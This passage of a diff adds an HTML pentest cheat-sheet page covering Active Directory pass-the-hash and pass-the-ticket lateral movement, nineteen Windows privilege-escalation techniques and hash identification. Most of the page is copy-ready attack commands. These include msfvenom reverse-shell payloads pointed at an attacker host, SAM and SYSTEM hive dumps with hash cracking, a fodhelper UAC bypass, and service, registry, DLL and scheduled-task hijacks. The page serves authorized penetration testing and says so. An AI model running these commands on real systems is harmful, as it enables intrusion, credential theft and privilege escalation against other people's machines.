+<span class="c"># Over-Pass-the-Hash / Pass-the-Ticket</span>
+<span class="t">impacket-getTGT</span> $DOMAIN/USER -hashes :<span class="v">&lt;NTHASH&gt;</span>          <span class="c"># -> USER.ccache</span>
+export KRB5CCNAME=USER.ccache
+<span class="t">impacket-psexec</span> -k -no-pass $DOMAIN/USER@$DC
+
+<span class="c"># RDP with restricted admin (PtH over RDP)</span>
+xfreerdp3 /v:$IP /u:Administrator /pth:<span class="v">&lt;NTHASH&gt;</span> /cert:ignore
+xfreerdp3 /v:$IP /u:Dark /p:<span class="s">'Password01!'</span> /sec:rdp /cert:ignore /tls-seclevel:0</pre></div>
+    <div class="port-table-wrap"><table>
+      <thead><tr><th>Method</th><th>Mechanism</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td class="m">psexec.py</td><td>SMB &rarr; ADMIN$ &rarr; service</td><td>SYSTEM, drops binary, noisy</td></tr>
+        <tr><td class="m">wmiexec.py</td><td>DCOM / WMI</td><td>Fileless-ish, semi-interactive</td></tr>
+        <tr><td class="m">smbexec.py</td><td>SMB + service</td><td>No binary upload</td></tr>
+        <tr><td class="m">atexec.py</td><td>Task Scheduler</td><td>One-shot output</td></tr>
+        <tr><td class="m">evil-winrm</td><td>WinRM 5985</td><td>Clean PowerShell shell</td></tr>
+        <tr><td class="m">nxc -x / -X</td><td>SMB/WinRM exec</td><td>Commands at scale</td></tr>
+      </tbody>
+    </table></div>
+  </div>
+
+  <!-- PRIVESC -->
+  <div class="section" id="privesc">
+    <div class="section-header"><span class="port-badge red">root</span><h2>Windows local privilege escalation</h2></div>
+    <p class="lead">Each block: how to detect, how to exploit, and the exact condition that makes it vulnerable vs a dead-end.</p>
+
+    <h3 class="sub">1 · Unquoted service path</h3>
+    <div class="code-block"><div class="code-label">detect / exploit <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="c"># detect</span>
+wmic service get name,pathname,startmode | findstr /i <span class="s">"Program Files"</span> | findstr /i /v <span class="s">'"'</span>
+sc qc WeakService
+accesschk.exe /accepteula -uwdq <span class="s">"C:\Program Files\Unquoted Path Service\"</span>
+<span class="c"># exploit — drop EXE at the first space-break</span>
+copy evil.exe <span class="s">"C:\Program Files\Unquoted Path Service\Common.exe"</span>
+sc stop Unquotedsvc &amp; sc start Unquotedsvc
+<span class="c"># setup (lab): sc.exe create WeakService binPath= "C:\Program Files\Weak Folder\Service.exe" start= auto</span></pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> binPath has a space, is unquoted, runs as SYSTEM, and you can write to an earlier folder (e.g. <code>C:\Program Files\</code> or the service dir) and restart it.</div><div class="safe"><b>SAFE IF</b> the path is quoted, has no space, or every parent folder is non-writable.</div></div>
+
+    <h3 class="sub">2 · Weak service permissions (SERVICE_CHANGE_CONFIG)</h3>
+    <div class="code-block"><div class="code-label">detect / exploit <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>accesschk.exe /accepteula -uwcqv user daclsvc
+sc qc daclsvc
+<span class="c"># repoint the binary, restart</span>
+sc config daclsvc binpath= <span class="s">"\"C:\PrivEsc\reverse.exe\""</span>
+sc stop daclsvc &amp; sc start daclsvc</pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> your user has <code>SERVICE_CHANGE_CONFIG</code> / <code>WRITE_DAC</code> on a service that runs as SYSTEM.</div><div class="safe"><b>SAFE IF</b> you only have query/start rights, or the service already runs in your context.</div></div>
+
+    <h3 class="sub">3 · Weak registry permissions (service key)</h3>
+    <div class="code-block"><div class="code-label">detect / exploit <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\evil.exe /f
+sc start regsvc</pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> you can write <code>ImagePath</code> under the service's registry key.</div><div class="safe"><b>SAFE IF</b> the key is admin-only (default).</div></div>
+
+    <h3 class="sub">4 · Insecure service binary / 5 · weak file perms on binary</h3>
+    <div class="code-block"><div class="code-label">detect / exploit <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>sc qc filepermsvc
+accesschk.exe /accepteula -quvw <span class="s">"C:\Program Files\File Permissions Service\filepermservice.exe"</span>
+icacls <span class="s">"C:\path\service.exe"</span>
+<span class="c"># overwrite the binary then restart the service</span>
+copy /y reverse.exe <span class="s">"C:\path\service.exe"</span>
+sc stop filepermsvc &amp; sc start filepermsvc</pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> <code>icacls</code> shows your group with <code>(F)</code>/<code>(W)</code>/<code>(M)</code> on the service EXE and it runs as SYSTEM.</div><div class="safe"><b>SAFE IF</b> only Administrators/SYSTEM can write the binary.</div></div>
+
+    <h3 class="sub">6 · AlwaysInstallElevated (MSI)</h3>
+    <div class="code-block"><div class="code-label">detect / exploit <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i C:\PrivEsc\evil.msi</pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> BOTH HKCU and HKLM values equal <code>0x1</code> &rarr; any MSI installs as SYSTEM.</div><div class="safe"><b>SAFE IF</b> either key is 0 or missing (only one set does nothing).</div></div>
+
+    <h3 class="sub">7 · Weak scheduled task</h3>
+    <div class="code-block"><div class="code-label">detect / exploit <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>schtasks /query /fo LIST /v | findstr /i <span class="s">"Author Run TaskName"</span>
+icacls C:\WeakTask\task.exe
+<span class="c"># overwrite the task binary, wait for it to run as SYSTEM</span>
+copy /y shell.exe C:\WeakTask\task.exe</pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> a task runs as SYSTEM/admin on a schedule and you can write its target binary or script.</div><div class="safe"><b>SAFE IF</b> the task runs as your user, or its binary path is non-writable.</div></div>
+
+    <h3 class="sub">8 · Autoruns / startup</h3>
+    <div class="code-block"><div class="code-label">detect / exploit <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+accesschk.exe /accepteula -wvu <span class="s">"C:\Program Files\Autorun Program\program.exe"</span>
+copy /y reverse.exe <span class="s">"C:\Program Files\Autorun Program\program.exe"</span>   <span class="c"># fires on next admin logon</span></pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> an autorun binary (HKLM Run) is writable and a higher-priv user logs in.</div><div class="safe"><b>SAFE IF</b> only HKCU (your own) autoruns or binary non-writable.</div></div>
+
+    <h3 class="sub">9-12 · Stored passwords &amp; hashes</h3>
+    <div class="code-block"><div class="code-label">registry / saved creds / SAM / PtH <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="c"># registry-stored creds</span>
+reg query HKLM /f password /t REG_SZ /s
+reg query <span class="s">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span>
+winexe -U <span class="s">'admin%password123'</span> //$IP cmd.exe
+
+<span class="c"># saved creds -> run as that user</span>
+cmdkey /list
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+<span class="c"># SAM dump (local) then crack / PtH</span>
+reg save HKLM\SAM sam.save &amp; reg save HKLM\SYSTEM system.save
+impacket-secretsdump -sam sam.save -system system.save LOCAL
+john --format=NT --wordlist=rockyou.txt hash.txt
+pth-winexe -U <span class="s">'admin%aad3b...:a9fdfa...'</span> //$IP cmd.exe</pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> creds sit in registry/Winlogon/cmdkey, or you can read SAM+SYSTEM (admin/SeBackup).</div><div class="safe"><b>SAFE IF</b> no stored creds and you lack read on the hives.</div></div>
+
+    <h3 class="sub">13 · Writable scripts run by others (PATH / ps1)</h3>
+    <div class="code-block"><div class="code-label">detect / exploit <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+type C:\DevTools\CleanUp.ps1
+echo C:\PrivEsc\reverse.exe &gt;&gt; C:\DevTools\CleanUp.ps1   <span class="c"># appended, runs when admin triggers</span></pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> a script executed by a privileged user/task is writable by you.</div><div class="safe"><b>SAFE IF</b> the script is read-only to you.</div></div>
+
+    <h3 class="sub">15 · DLL hijacking</h3>
+    <div class="code-block"><div class="code-label">procmon / msfvenom <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="c"># detect: ProcMon -> filter Result = NAME NOT FOUND, *.dll in writable dir</span>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o hijack.dll
+copy hijack.dll <span class="s">"C:\writable\on\PATH\missing.dll"</span></pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> a privileged process loads a missing DLL from a directory you can write (or a writable dir precedes System32 in PATH).</div><div class="safe"><b>SAFE IF</b> DLLs resolve from System32 / signed paths only.</div></div>
+
+    <h3 class="sub">16 · Token impersonation — Potato (SeImpersonate)</h3>
+    <div class="code-block"><div class="code-label">PrintSpoofer / GodPotato <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>whoami /priv | findstr /i SeImpersonate
+PrintSpoofer64.exe -i -c cmd.exe
+GodPotato-NET4.exe -cmd <span class="s">"C:\PrivEsc\reverse.exe"</span>   <span class="c"># start a listener first</span></pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> <code>SeImpersonatePrivilege</code> or <code>SeAssignPrimaryTokenPrivilege</code> is Enabled (typical for service accounts / IIS / MSSQL).</div><div class="safe"><b>SAFE IF</b> those privileges are absent from your token.</div></div>
+
+    <h3 class="sub">17 · UAC bypass (fodhelper)</h3>
+    <div class="code-block"><div class="code-label">registry hijack <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d <span class="s">"cmd.exe"</span> /f
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
+fodhelper.exe   <span class="c"># auto-elevates, spawns elevated cmd</span></pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> you're in the local Administrators group but running un-elevated (medium integrity) with default UAC.</div><div class="safe"><b>SAFE IF</b> you're a non-admin user — UAC bypass only elevates an admin that's being filtered, it is not privesc for standard users.</div></div>
+
+    <h3 class="sub">18 · SeBackup / SeRestore — shadow copy dump</h3>
+    <div class="code-block"><div class="code-label">diskshadow / reg save <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>whoami /priv | findstr /i SeBackup
+reg save HKLM\SAM sam.save &amp; reg save HKLM\SYSTEM system.save
+<span class="c"># or NTDS.dit on a DC via shadow copy</span>
+vssadmin list shadows</pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> <code>SeBackupPrivilege</code> present &rarr; read any file incl. SAM/SYSTEM/NTDS.dit.</div><div class="safe"><b>SAFE IF</b> privilege not held.</div></div>
+
+    <h3 class="sub">19 · Kernel exploits (last resort)</h3>
+    <div class="code-block"><div class="code-label">systeminfo &rarr; suggester <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>systeminfo &gt; sysinfo.txt
+<span class="c"># windows-exploit-suggester / wesng</span>
+python wes.py sysinfo.txt
+<span class="c"># classic: MS16-032 (Invoke-MS16032), PrintNightmare, HiveNightmare (CVE-2021-36934)</span></pre></div>
+    <div class="mis"><div class="vuln"><b>VULN IF</b> unpatched old build matches a public PoC (check patch KBs in systeminfo).</div><div class="safe"><b>SAFE IF</b> fully patched — try the config-based routes above first; kernel PoCs can crash the box.</div></div>
+  </div>
+
+  <!-- DECODE -->
+  <div class="section" id="decode">
+    <div class="section-header"><span class="port-badge violet">0x</span><h2>Decode &amp; identify — hashes / hex / encodings</h2></div>
+    <p class="lead">When you find a blob and don't know what it is: identify it, then decode or route it to the right cracker.</p>
+    <div class="code-block"><div class="code-label">identify first <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre>hashid <span class="s">'&lt;blob&gt;'</span>
+hash-identifier
+nth --text <span class="s">'&lt;blob&gt;'</span>          <span class="c"># name-that-hash, gives hashcat -m</span>
+hashcat --identify <span class="s">hash.txt</span></pre></div>
+    <div class="code-block"><div class="code-label">decode common encodings <button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+<pre><span class="c"># Base64</span>
+echo <span class="s">'SGVsbG8='</span> | base64 -d
+<span class="c"># Hex</span>
+echo <span class="s">'48656c6c6f'</span> | xxd -r -p
+python3 -c <span class="s">"print(bytes.fromhex('48656c6c6f'))"</span>
+<span class="c"># URL</span>
+python3 -c <span class="s">"import urllib.parse,sys;print(urllib.parse.unquote('%41%42'))"</span>
+<span class="c"># ROT13</span>
+echo <span class="s">'Uryyb'</span> | tr <span class="s">'A-Za-z'</span> <span class="s">'N-ZA-Mn-za-m'</span>
+<span class="c"># Base32 / gzip / combos -> CyberChef "Magic" operation</span></pre></div>
+    <h3 class="sub">Hash cheat — shape &rarr; what it is &rarr; hashcat mode</h3>
+    <div class="port-table-wrap"><table>
+      <thead><tr><th>Looks like</th><th>Type</th><th>Mode</th></tr></thead>
+      <tbody>
+        <tr><td class="m">32 hex</td><td>NTLM or MD5</td><td>1000 / 0</td></tr>
+        <tr><td class="m">aad3b435...:&lt;32hex&gt;</td><td>LM:NT (pwdump)</td><td>1000 (NT part)</td></tr>
+        <tr><td class="m">40 hex</td><td>SHA1</td><td>100</td></tr>
+        <tr><td class="m">64 hex</td><td>SHA256</td><td>1400</td></tr>
+        <tr><td class="m">$krb5asrep$23$...</td><td>AS-REP</td><td>18200</td></tr>
+        <tr><td class="m">$krb5tgs$23$...</td><td>Kerberoast TGS</td><td>13100</td></tr>
+        <tr><td class="m">user::DOMAIN:...:... </td><td>NetNTLMv2 (responder)</td><td>5600</td></tr>
+        <tr><td class="m">$2a$/$2b$...</td><td>bcrypt</td><td>3200</td></tr>
+        <tr><td class="m">$6$...</td><td>sha512crypt (Linux)</td><td>1800</td></tr>
+        <tr><td class="m">{SSHA}... (b64)</td><td>LDAP SSHA</td><td>111</td></tr>
+        <tr><td class="m">$DCC2$/$MSCACHE</td><td>Domain cached (mscash2)</td><td>2100</td></tr>
+      </tbody>
+    </table></div>
+    <div class="note"><b>31d6cfe0d16ae931b73c59d7e0c089c0</b> is the NT hash of an <b>empty password</b> — seeing it means that account has a blank password. Crack NT/MD5 with <code>hashcat -m 1000</code> / <code>john --format=NT</code>, and reach for CyberChef's <b>Magic</b> op when an encoding is layered or unknown.</div>
+  </div>
+
+  <div class="section" id="gotchas">
+    <div class="section-header"><span class="port-badge orange">!</span><h2>Gotchas</h2></div>
+    <div class="note warn"><b>Clock skew</b> — sync to the DC (<code>ntpdate $IP</code>) before any Kerberos tool or you get <code>KRB_AP_ERR_SKEW</code>.</div>
+    <div class="note warn"><b>FQDN resolution</b> — add the DC to <code>/etc/hosts</code> so Kerberos/LDAP by name works.</div>
+    <div class="note warn"><b>rpcbind</b> — start it on your attacker box (<code>sudo systemctl start rpcbind</code>) before <code>showmount</code>/<code>mount</code> for NFS.</div>
+    <div class="note warn"><b>Lockout</b> — check <code>net accounts</code> / domain policy before spraying; stay under the threshold and add delays.</div>
+    <div class="note"><b>Authorized use only.</b> These techniques are for systems you own or are explicitly contracted to test.</div>
+  </div>
+
+</main>
+
+<script>
+function toggleTheme(){
+  const r=document.documentElement, cur=r.getAttribute('data-theme');
+  const sys=window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';
+  if(!cur){ r.setAttribute('data-theme', sys==='dark'?'light':'dark'); }
+  else{ r.removeAttribute('data-theme'); }
+  try{ localStorage.setItem('theme', r.getAttribute('data-theme')||'system'); }catch(e){}
+}
+try{ const t=localStorage.getItem('theme'); if(t&&t!=='system') document.documentElement.setAttribute('data-theme',t); }catch(e){}
+function copyCode(btn){
+  const pre=btn.closest('.code-block').querySelector('pre'); const text=pre.innerText;
+  navigator.clipboard.writeText(text).then(()=>{btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',1400);})
+  .catch(()=>{const s=window.getSelection(),r=document.createRange();r.selectNodeContents(pre);s.removeAllRanges();s.addRange(r);btn.textContent='Selected';setTimeout(()=>btn.textContent='Copy',1400);});
+}
+const secs=document.querySelectorAll('.section'), links=document.querySelectorAll('#nav a');
+const obs=new IntersectionObserver((es)=>{es.forEach(e=>{if(e.isIntersecting){links.forEach(l=>l.classList.remove('active'));const a=document.querySelector('#nav a[href="#'+e.target.id+'"]');if(a)a.classList.add('active');}});},{rootMargin:'-15% 0px -75% 0px'});
+secs.forEach(s=>obs.observe(s));
+</script>
+
+</body></html>
